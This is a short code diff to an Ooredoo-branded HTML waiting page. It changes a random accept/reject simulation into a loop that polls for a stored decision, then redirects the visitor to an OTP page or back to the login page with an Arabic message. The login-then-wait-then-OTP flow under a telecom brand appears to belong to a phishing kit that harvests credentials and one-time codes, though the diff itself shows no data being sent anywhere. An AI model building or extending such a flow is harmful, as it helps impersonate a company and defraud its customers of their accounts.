@@ -77,18 +77,38 @@
 </main>
 
 <script>
-  // محاكاة النتيجة: إذا تم القبول -> صفحة OTP، وإذا تم الرفض -> تسجيل الدخول برسالة خطأ
-  setTimeout(() => {
-    const isAccepted = Math.random() > 0.5;
-    
-    if (isAccepted) {
+  function getFlowDecision() {
+    return localStorage.getItem('ooredooDecision') || sessionStorage.getItem('ooredooDecision') || '';
+  }
+
+  function setFlowDecision(decision) {
+    try {
+      localStorage.setItem('ooredooDecision', decision);
+      sessionStorage.setItem('ooredooDecision', decision);
+    } catch (err) {}
+  }
+
+  function checkDecision() {
+    const decision = getFlowDecision();
+
+    if (decision === 'accept') {
       sessionStorage.setItem('loginError', 'تم قبول الطلب. يرجى متابعة التحقق من الرمز.');
       window.location.href = 'otp_ooredoo.html';
-    } else {
-      sessionStorage.setItem('loginError', 'تم رفض الطلب. يرجى إعادة تسجيل الدخول والمحاولة مرة أخرى.');
-      window.location.href = 'login_ooredoo.html';
+      return;
     }
-  }, 2500);
+
+    if (decision === 'reject') {
+      sessionStorage.setItem('loginError', 'تم رفض الطلب. يرجى إعادة تسجيل الدخول والمحاولة مرة أخرى.');
+      localStorage.removeItem('ooredooDecision');
+      sessionStorage.removeItem('ooredooDecision');
+      window.location.href = 'login_ooredoo.html';
+      return;
+    }
+
+    setTimeout(checkDecision, 2000);
+  }
+
+  checkDecision();
 </script>
 
 </body>
